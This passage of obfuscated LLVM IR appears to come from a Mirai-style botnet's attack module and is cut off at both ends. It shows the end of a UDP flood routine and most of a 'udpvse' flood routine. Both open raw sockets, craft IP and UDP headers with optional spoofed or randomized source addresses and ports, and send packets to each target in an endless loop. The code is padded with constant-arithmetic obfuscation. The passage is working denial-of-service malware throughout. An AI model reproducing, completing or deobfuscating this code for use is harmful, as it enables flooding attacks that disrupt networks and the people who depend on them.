  %38 = call i32 @attack_get_opt_int(i8 zeroext %36, %struct.attack_option* %37, i8 zeroext 3, i32 65535)
  %39 = trunc i32 %38 to i16
  store i16 %39, i16* %13, align 2
  %40 = load i8, i8* %7, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 4, i32 64)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %7, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 5, i32 0)
  %47 = trunc i32 %46 to i8
  store i8 %47, i8* %15, align 1
  %48 = load i8, i8* %7, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 6, i32 65535)
  %51 = trunc i32 %50 to i16
  store i16 %51, i16* %16, align 2
  %52 = load i8, i8* %7, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 7, i32 65535)
  %55 = trunc i32 %54 to i16
  store i16 %55, i16* %17, align 2
  %56 = load i8, i8* %7, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 0, i32 512)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 1, i32 1)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %19, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = load i32, i32* @LOCAL_ADDR, align 4
  %67 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 25, i32 %66)
  store i32 %67, i32* %20, align 4
  %68 = load i16, i16* %18, align 2
  %69 = zext i16 %68 to i32
  %70 = icmp sgt i32 %69, 1460
  br i1 %70, label %71, label %72

; <label>:71:                                     ; preds = %4
  store i16 1460, i16* %18, align 2
  br label %72

; <label>:72:                                     ; preds = %71, %4
  %73 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %73, i32* %10, align 4
  %74 = icmp eq i32 %73, -1
  br i1 %74, label %75, label %76

; <label>:75:                                     ; preds = %72
  br label %351

; <label>:76:                                     ; preds = %72
  store i32 1, i32* %9, align 4
  %77 = load i32, i32* %10, align 4
  %78 = bitcast i32* %9 to i8*
  %79 = call i32 @setsockopt(i32 %77, i32 0, i32 3, i8* %78, i32 4) #6
  %80 = icmp eq i32 %79, -1
  br i1 %80, label %81, label %84

; <label>:81:                                     ; preds = %76
  %82 = load i32, i32* %10, align 4
  %83 = call i32 @close(i32 %82)
  br label %351

; <label>:84:                                     ; preds = %76
  store i32 0, i32* %9, align 4
  br label %85

; <label>:85:                                     ; preds = %190, %84
  %86 = load i32, i32* %9, align 4
  %87 = load i8, i8* %5, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp slt i32 %86, %88
  br i1 %89, label %90, label %196

; <label>:90:                                     ; preds = %85
  %91 = call noalias i8* @calloc(i64 1510, i64 1) #6
  %92 = load i8**, i8*** %11, align 8
  %93 = load i32, i32* %9, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8*, i8** %92, i64 %94
  store i8* %91, i8** %95, align 8
  %96 = load i8**, i8*** %11, align 8
  %97 = load i32, i32* %9, align 4
  %98 = sext i32 %97 to i64
  %99 = getelementptr inbounds i8*, i8** %96, i64 %98
  %100 = load i8*, i8** %99, align 8
  %101 = bitcast i8* %100 to %struct.iphdr*
  store %struct.iphdr* %101, %struct.iphdr** %21, align 8
  %102 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %103 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %102, i64 1
  %104 = bitcast %struct.iphdr* %103 to %struct.udphdr*
  store %struct.udphdr* %104, %struct.udphdr** %22, align 8
  %105 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %106 = bitcast %struct.iphdr* %105 to i8*
  %107 = load i8, i8* %106, align 4
  %108 = xor i8 %107, -1
  %109 = xor i8 15, -1
  %110 = xor i8 -29, -1
  %111 = or i8 %108, %109
  %112 = or i8 -29, %110
  %113 = xor i8 %111, -1
  %114 = and i8 %113, %112
  %115 = and i8 %107, 15
  %116 = and i8 %114, 64
  %117 = xor i8 %114, 64
  %118 = or i8 %116, %117
  %119 = or i8 %114, 64
  store i8 %118, i8* %106, align 4
  %120 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %121 = bitcast %struct.iphdr* %120 to i8*
  %122 = load i8, i8* %121, align 4
  %123 = xor i8 -16, -1
  %124 = xor i8 %122, %123
  %125 = and i8 %124, %122
  %126 = and i8 %122, -16
  %127 = and i8 %125, 5
  %128 = xor i8 %125, 5
  %129 = or i8 %127, %128
  %130 = or i8 %125, 5
  store i8 %129, i8* %121, align 4
  %131 = load i8, i8* %12, align 1
  %132 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %133 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %132, i32 0, i32 1
  store i8 %131, i8* %133, align 1
  %134 = load i16, i16* %18, align 2
  %135 = zext i16 %134 to i64
  %136 = sub i64 0, 28
  %137 = sub i64 0, %135
  %138 = add i64 %136, %137
  %139 = sub i64 0, %138
  %140 = add i64 28, %135
  %141 = trunc i64 %139 to i16
  %142 = call zeroext i16 @htons(i16 zeroext %141) #7
  %143 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %144 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %143, i32 0, i32 2
  store i16 %142, i16* %144, align 2
  %145 = load i16, i16* %13, align 2
  %146 = call zeroext i16 @htons(i16 zeroext %145) #7
  %147 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %148 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %147, i32 0, i32 3
  store i16 %146, i16* %148, align 4
  %149 = load i8, i8* %14, align 1
  %150 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %151 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %150, i32 0, i32 5
  store i8 %149, i8* %151, align 4
  %152 = load i8, i8* %15, align 1
  %153 = icmp ne i8 %152, 0
  br i1 %153, label %154, label %158

; <label>:154:                                    ; preds = %90
  %155 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %156 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 4
  store i16 %155, i16* %157, align 2
  br label %158

; <label>:158:                                    ; preds = %154, %90
  %159 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 6
  store i8 17, i8* %160, align 1
  %161 = load i32, i32* %20, align 4
  %162 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 8
  store i32 %161, i32* %163, align 4
  %164 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %165 = load i32, i32* %9, align 4
  %166 = sext i32 %165 to i64
  %167 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %164, i64 %166
  %168 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %167, i32 0, i32 1
  %169 = load i32, i32* %168, align 4
  %170 = load %struct.iphdr*, %struct.iphdr** %21, align 8
  %171 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %170, i32 0, i32 9
  store i32 %169, i32* %171, align 4
  %172 = load i16, i16* %16, align 2
  %173 = call zeroext i16 @htons(i16 zeroext %172) #7
  %174 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %175 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %174, i32 0, i32 0
  store i16 %173, i16* %175, align 2
  %176 = load i16, i16* %17, align 2
  %177 = call zeroext i16 @htons(i16 zeroext %176) #7
  %178 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %179 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %178, i32 0, i32 1
  store i16 %177, i16* %179, align 2
  %180 = load i16, i16* %18, align 2
  %181 = zext i16 %180 to i64
  %182 = add i64 8, -582933044755284207
  %183 = add i64 %182, %181
  %184 = sub i64 %183, -582933044755284207
  %185 = add i64 8, %181
  %186 = trunc i64 %184 to i16
  %187 = call zeroext i16 @htons(i16 zeroext %186) #7
  %188 = load %struct.udphdr*, %struct.udphdr** %22, align 8
  %189 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %188, i32 0, i32 2
  store i16 %187, i16* %189, align 2
  br label %190

; <label>:190:                                    ; preds = %158
  %191 = load i32, i32* %9, align 4
  %192 = sub i32 %191, 851084029
  %193 = add i32 %192, 1
  %194 = add i32 %193, 851084029
  %195 = add nsw i32 %191, 1
  store i32 %194, i32* %9, align 4
  br label %85

; <label>:196:                                    ; preds = %85
  br label %197

; <label>:197:                                    ; preds = %350, %196
  store i32 0, i32* %9, align 4
  br label %198

; <label>:198:                                    ; preds = %343, %197
  %199 = load i32, i32* %9, align 4
  %200 = load i8, i8* %5, align 1
  %201 = zext i8 %200 to i32
  %202 = icmp slt i32 %199, %201
  br i1 %202, label %203, label %350

; <label>:203:                                    ; preds = %198
  %204 = load i8**, i8*** %11, align 8
  %205 = load i32, i32* %9, align 4
  %206 = sext i32 %205 to i64
  %207 = getelementptr inbounds i8*, i8** %204, i64 %206
  %208 = load i8*, i8** %207, align 8
  store i8* %208, i8** %23, align 8
  %209 = load i8*, i8** %23, align 8
  %210 = bitcast i8* %209 to %struct.iphdr*
  store %struct.iphdr* %210, %struct.iphdr** %24, align 8
  %211 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %212 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %211, i64 1
  %213 = bitcast %struct.iphdr* %212 to %struct.udphdr*
  store %struct.udphdr* %213, %struct.udphdr** %25, align 8
  %214 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %215 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %214, i64 1
  %216 = bitcast %struct.udphdr* %215 to i8*
  store i8* %216, i8** %26, align 8
  %217 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %218 = load i32, i32* %9, align 4
  %219 = sext i32 %218 to i64
  %220 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %217, i64 %219
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %220, i32 0, i32 2
  %222 = load i8, i8* %221, align 4
  %223 = zext i8 %222 to i32
  %224 = icmp slt i32 %223, 32
  br i1 %224, label %225, label %249

; <label>:225:                                    ; preds = %203
  %226 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %227 = load i32, i32* %9, align 4
  %228 = sext i32 %227 to i64
  %229 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %226, i64 %228
  %230 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %229, i32 0, i32 1
  %231 = load i32, i32* %230, align 4
  %232 = call i32 @ntohl(i32 %231) #7
  %233 = call i32 @rand_next()
  %234 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %235 = load i32, i32* %9, align 4
  %236 = sext i32 %235 to i64
  %237 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %234, i64 %236
  %238 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %237, i32 0, i32 2
  %239 = load i8, i8* %238, align 4
  %240 = zext i8 %239 to i32
  %241 = lshr i32 %233, %240
  %242 = sub i32 %232, -1758566358
  %243 = add i32 %242, %241
  %244 = add i32 %243, -1758566358
  %245 = add i32 %232, %241
  %246 = call i32 @htonl(i32 %244) #7
  %247 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %248 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %247, i32 0, i32 9
  store i32 %246, i32* %248, align 4
  br label %249

; <label>:249:                                    ; preds = %225, %203
  %250 = load i32, i32* %20, align 4
  %251 = icmp eq i32 %250, -1
  br i1 %251, label %252, label %256

; <label>:252:                                    ; preds = %249
  %253 = call i32 @rand_next()
  %254 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %255 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %254, i32 0, i32 8
  store i32 %253, i32* %255, align 4
  br label %256

; <label>:256:                                    ; preds = %252, %249
  %257 = load i16, i16* %13, align 2
  %258 = zext i16 %257 to i32
  %259 = icmp eq i32 %258, 65535
  br i1 %259, label %260, label %265

; <label>:260:                                    ; preds = %256
  %261 = call i32 @rand_next()
  %262 = trunc i32 %261 to i16
  %263 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 3
  store i16 %262, i16* %264, align 4
  br label %265

; <label>:265:                                    ; preds = %260, %256
  %266 = load i16, i16* %16, align 2
  %267 = zext i16 %266 to i32
  %268 = icmp eq i32 %267, 65535
  br i1 %268, label %269, label %274

; <label>:269:                                    ; preds = %265
  %270 = call i32 @rand_next()
  %271 = trunc i32 %270 to i16
  %272 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %273 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %272, i32 0, i32 0
  store i16 %271, i16* %273, align 2
  br label %274

; <label>:274:                                    ; preds = %269, %265
  %275 = load i16, i16* %17, align 2
  %276 = zext i16 %275 to i32
  %277 = icmp eq i32 %276, 65535
  br i1 %277, label %278, label %283

; <label>:278:                                    ; preds = %274
  %279 = call i32 @rand_next()
  %280 = trunc i32 %279 to i16
  %281 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %282 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %281, i32 0, i32 1
  store i16 %280, i16* %282, align 2
  br label %283

; <label>:283:                                    ; preds = %278, %274
  %284 = load i8, i8* %19, align 1
  %285 = icmp ne i8 %284, 0
  br i1 %285, label %286, label %290

; <label>:286:                                    ; preds = %283
  %287 = load i8*, i8** %26, align 8
  %288 = load i16, i16* %18, align 2
  %289 = zext i16 %288 to i32
  call void @rand_str(i8* %287, i32 %289)
  br label %290

; <label>:290:                                    ; preds = %286, %283
  %291 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %292 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %291, i32 0, i32 7
  store i16 0, i16* %292, align 2
  %293 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %294 = bitcast %struct.iphdr* %293 to i16*
  %295 = call zeroext i16 @checksum_generic(i16* %294, i32 20)
  %296 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %297 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %296, i32 0, i32 7
  store i16 %295, i16* %297, align 2
  %298 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %299 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %298, i32 0, i32 3
  store i16 0, i16* %299, align 2
  %300 = load %struct.iphdr*, %struct.iphdr** %24, align 8
  %301 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %302 = bitcast %struct.udphdr* %301 to i8*
  %303 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %304 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %303, i32 0, i32 2
  %305 = load i16, i16* %304, align 2
  %306 = load i16, i16* %18, align 2
  %307 = zext i16 %306 to i64
  %308 = sub i64 0, 8
  %309 = sub i64 0, %307
  %310 = add i64 %308, %309
  %311 = sub i64 0, %310
  %312 = add i64 8, %307
  %313 = trunc i64 %311 to i32
  %314 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %300, i8* %302, i16 zeroext %305, i32 %313)
  %315 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %316 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %315, i32 0, i32 3
  store i16 %314, i16* %316, align 2
  %317 = load %struct.udphdr*, %struct.udphdr** %25, align 8
  %318 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %317, i32 0, i32 1
  %319 = load i16, i16* %318, align 2
  %320 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %321 = load i32, i32* %9, align 4
  %322 = sext i32 %321 to i64
  %323 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %320, i64 %322
  %324 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %323, i32 0, i32 0
  %325 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %324, i32 0, i32 1
  store i16 %319, i16* %325, align 2
  %326 = load i32, i32* %10, align 4
  %327 = load i8*, i8** %23, align 8
  %328 = load i16, i16* %18, align 2
  %329 = zext i16 %328 to i64
  %330 = sub i64 0, %329
  %331 = sub i64 28, %330
  %332 = add i64 28, %329
  %333 = bitcast %union.__CONST_SOCKADDR_ARG* %27 to %struct.sockaddr**
  %334 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %335 = load i32, i32* %9, align 4
  %336 = sext i32 %335 to i64
  %337 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %334, i64 %336
  %338 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %337, i32 0, i32 0
  %339 = bitcast %struct.sockaddr_in* %338 to %struct.sockaddr*
  store %struct.sockaddr* %339, %struct.sockaddr** %333, align 8
  %340 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %27, i32 0, i32 0
  %341 = load %struct.sockaddr*, %struct.sockaddr** %340, align 8
  %342 = call i64 @sendto(i32 %326, i8* %327, i64 %331, i32 16384, %struct.sockaddr* %341, i32 16)
  br label %343

; <label>:343:                                    ; preds = %290
  %344 = load i32, i32* %9, align 4
  %345 = sub i32 0, %344
  %346 = sub i32 0, 1
  %347 = add i32 %345, %346
  %348 = sub i32 0, %347
  %349 = add nsw i32 %344, 1
  store i32 %348, i32* %9, align 4
  br label %198

; <label>:350:                                    ; preds = %198
  br label %197

; <label>:351:                                    ; preds = %81, %75
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_udpvse(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i8*, align 8
  %19 = alloca i32, align 4
  %20 = alloca %struct.iphdr*, align 8
  %21 = alloca %struct.udphdr*, align 8
  %22 = alloca i8*, align 8
  %23 = alloca i8*, align 8
  %24 = alloca %struct.iphdr*, align 8
  %25 = alloca %struct.udphdr*, align 8
  %26 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %27 = load i8, i8* %5, align 1
  %28 = zext i8 %27 to i64
  %29 = call noalias i8* @calloc(i64 %28, i64 8) #6
  %30 = bitcast i8* %29 to i8**
  store i8** %30, i8*** %11, align 8
  %31 = load i8, i8* %7, align 1
  %32 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %33 = call i32 @attack_get_opt_int(i8 zeroext %31, %struct.attack_option* %32, i8 zeroext 2, i32 0)
  %34 = trunc i32 %33 to i8
  store i8 %34, i8* %12, align 1
  %35 = load i8, i8* %7, align 1
  %36 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %37 = call i32 @attack_get_opt_int(i8 zeroext %35, %struct.attack_option* %36, i8 zeroext 3, i32 65535)
  %38 = trunc i32 %37 to i16
  store i16 %38, i16* %13, align 2
  %39 = load i8, i8* %7, align 1
  %40 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %41 = call i32 @attack_get_opt_int(i8 zeroext %39, %struct.attack_option* %40, i8 zeroext 4, i32 64)
  %42 = trunc i32 %41 to i8
  store i8 %42, i8* %14, align 1
  %43 = load i8, i8* %7, align 1
  %44 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %45 = call i32 @attack_get_opt_int(i8 zeroext %43, %struct.attack_option* %44, i8 zeroext 5, i32 0)
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %15, align 1
  %47 = load i8, i8* %7, align 1
  %48 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %49 = call i32 @attack_get_opt_int(i8 zeroext %47, %struct.attack_option* %48, i8 zeroext 6, i32 65535)
  %50 = trunc i32 %49 to i16
  store i16 %50, i16* %16, align 2
  %51 = load i8, i8* %7, align 1
  %52 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %53 = call i32 @attack_get_opt_int(i8 zeroext %51, %struct.attack_option* %52, i8 zeroext 7, i32 27015)
  %54 = trunc i32 %53 to i16
  store i16 %54, i16* %17, align 2
  call void @table_unlock_val(i8 zeroext 20)
  %55 = call i8* @table_retrieve_val(i32 20, i32* %19)
  store i8* %55, i8** %18, align 8
  %56 = call i32 @socket(i32 2, i32 3, i32 17) #6
  store i32 %56, i32* %10, align 4
  %57 = icmp eq i32 %56, -1
  br i1 %57, label %58, label %59

; <label>:58:                                     ; preds = %4
  br label %351

; <label>:59:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %60 = load i32, i32* %10, align 4
  %61 = bitcast i32* %9 to i8*
  %62 = call i32 @setsockopt(i32 %60, i32 0, i32 3, i8* %61, i32 4) #6
  %63 = icmp eq i32 %62, -1
  br i1 %63, label %64, label %67

; <label>:64:                                     ; preds = %59
  %65 = load i32, i32* %10, align 4
  %66 = call i32 @close(i32 %65)
  br label %351

; <label>:67:                                     ; preds = %59
  store i32 0, i32* %9, align 4
  br label %68

; <label>:68:                                     ; preds = %207, %67
  %69 = load i32, i32* %9, align 4
  %70 = load i8, i8* %5, align 1
  %71 = zext i8 %70 to i32
  %72 = icmp slt i32 %69, %71
  br i1 %72, label %73, label %213

; <label>:73:                                     ; preds = %68
  %74 = call noalias i8* @calloc(i64 128, i64 1) #6
  %75 = load i8**, i8*** %11, align 8
  %76 = load i32, i32* %9, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8*, i8** %75, i64 %77
  store i8* %74, i8** %78, align 8
  %79 = load i8**, i8*** %11, align 8
  %80 = load i32, i32* %9, align 4
  %81 = sext i32 %80 to i64
  %82 = getelementptr inbounds i8*, i8** %79, i64 %81
  %83 = load i8*, i8** %82, align 8
  %84 = bitcast i8* %83 to %struct.iphdr*
  store %struct.iphdr* %84, %struct.iphdr** %20, align 8
  %85 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %86 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %85, i64 1
  %87 = bitcast %struct.iphdr* %86 to %struct.udphdr*
  store %struct.udphdr* %87, %struct.udphdr** %21, align 8
  %88 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %89 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %88, i64 1
  %90 = bitcast %struct.udphdr* %89 to i8*
  store i8* %90, i8** %22, align 8
  %91 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %92 = bitcast %struct.iphdr* %91 to i8*
  %93 = load i8, i8* %92, align 4
  %94 = xor i8 15, -1
  %95 = xor i8 %93, %94
  %96 = and i8 %95, %93
  %97 = and i8 %93, 15
  %98 = xor i8 %96, -1
  %99 = xor i8 64, -1
  %100 = xor i8 -71, -1
  %101 = and i8 %98, -71
  %102 = and i8 %96, %100
  %103 = and i8 %99, -71
  %104 = and i8 64, %100
  %105 = or i8 %101, %102
  %106 = or i8 %103, %104
  %107 = xor i8 %105, %106
  %108 = or i8 %98, %99
  %109 = xor i8 %108, -1
  %110 = or i8 -71, %100
  %111 = and i8 %109, %110
  %112 = or i8 %107, %111
  %113 = or i8 %96, 64
  store i8 %112, i8* %92, align 4
  %114 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %115 = bitcast %struct.iphdr* %114 to i8*
  %116 = load i8, i8* %115, align 4
  %117 = xor i8 %116, -1
  %118 = xor i8 -16, -1
  %119 = xor i8 35, -1
  %120 = or i8 %117, %118
  %121 = or i8 35, %119
  %122 = xor i8 %120, -1
  %123 = and i8 %122, %121
  %124 = and i8 %116, -16
  %125 = xor i8 %123, -1
  %126 = xor i8 5, -1
  %127 = xor i8 -67, -1
  %128 = and i8 %125, -67
  %129 = and i8 %123, %127
  %130 = and i8 %126, -67
  %131 = and i8 5, %127
  %132 = or i8 %128, %129
  %133 = or i8 %130, %131
  %134 = xor i8 %132, %133
  %135 = or i8 %125, %126
  %136 = xor i8 %135, -1
  %137 = or i8 -67, %127
  %138 = and i8 %136, %137
  %139 = or i8 %134, %138
  %140 = or i8 %123, 5
  store i8 %139, i8* %115, align 4
  %141 = load i8, i8* %12, align 1
  %142 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %143 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %142, i32 0, i32 1
  store i8 %141, i8* %143, align 1
  %144 = load i32, i32* %19, align 4
  %145 = sext i32 %144 to i64
  %146 = add i64 32, -4486669543533894554
  %147 = add i64 %146, %145
  %148 = sub i64 %147, -4486669543533894554
  %149 = add i64 32, %145
  %150 = trunc i64 %148 to i16
  %151 = call zeroext i16 @htons(i16 zeroext %150) #7
  %152 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 2
  store i16 %151, i16* %153, align 2
  %154 = load i16, i16* %13, align 2
  %155 = call zeroext i16 @htons(i16 zeroext %154) #7
  %156 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %157 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %156, i32 0, i32 3
  store i16 %155, i16* %157, align 4
  %158 = load i8, i8* %14, align 1
  %159 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %160 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %159, i32 0, i32 5
  store i8 %158, i8* %160, align 4
  %161 = load i8, i8* %15, align 1
  %162 = icmp ne i8 %161, 0
  br i1 %162, label %163, label %167

; <label>:163:                                    ; preds = %73
  %164 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %165 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %166 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %165, i32 0, i32 4
  store i16 %164, i16* %166, align 2
  br label %167

; <label>:167:                                    ; preds = %163, %73
  %168 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %169 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %168, i32 0, i32 6
  store i8 17, i8* %169, align 1
  %170 = load i32, i32* @LOCAL_ADDR, align 4
  %171 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %172 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %171, i32 0, i32 8
  store i32 %170, i32* %172, align 4
  %173 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %174 = load i32, i32* %9, align 4
  %175 = sext i32 %174 to i64
  %176 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %173, i64 %175
  %177 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %176, i32 0, i32 1
  %178 = load i32, i32* %177, align 4
  %179 = load %struct.iphdr*, %struct.iphdr** %20, align 8
  %180 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %179, i32 0, i32 9
  store i32 %178, i32* %180, align 4
  %181 = load i16, i16* %16, align 2
  %182 = call zeroext i16 @htons(i16 zeroext %181) #7
  %183 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %184 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %183, i32 0, i32 0
  store i16 %182, i16* %184, align 2
  %185 = load i16, i16* %17, align 2
  %186 = call zeroext i16 @htons(i16 zeroext %185) #7
  %187 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %188 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %187, i32 0, i32 1
  store i16 %186, i16* %188, align 2
  %189 = load i32, i32* %19, align 4
  %190 = sext i32 %189 to i64
  %191 = sub i64 0, 12
  %192 = sub i64 0, %190
  %193 = add i64 %191, %192
  %194 = sub i64 0, %193
  %195 = add i64 12, %190
  %196 = trunc i64 %194 to i16
  %197 = call zeroext i16 @htons(i16 zeroext %196) #7
  %198 = load %struct.udphdr*, %struct.udphdr** %21, align 8
  %199 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %198, i32 0, i32 2
  store i16 %197, i16* %199, align 2
  %200 = load i8*, i8** %22, align 8
  %201 = bitcast i8* %200 to i32*
  store i32 -1, i32* %201, align 4
  %202 = load i8*, i8** %22, align 8
  %203 = getelementptr inbounds i8, i8* %202, i64 4
  store i8* %203, i8** %22, align 8
  %204 = load i8*, i8** %22, align 8
  %205 = load i8*, i8** %18, align 8
  %206 = load i32, i32* %19, align 4
  call void @util_memcpy(i8* %204, i8* %205, i32 %206)
  br label %207

; <label>:207:                                    ; preds = %167
  %208 = load i32, i32* %9, align 4
  %209 = add i32 %208, 2089225046
  %210 = add i32 %209, 1
  %211 = sub i32 %210, 2089225046
  %212 = add nsw i32 %208, 1
  store i32 %211, i32* %9, align 4
  br label %68

; <label>:213:                                    ; preds = %68
  br label %214

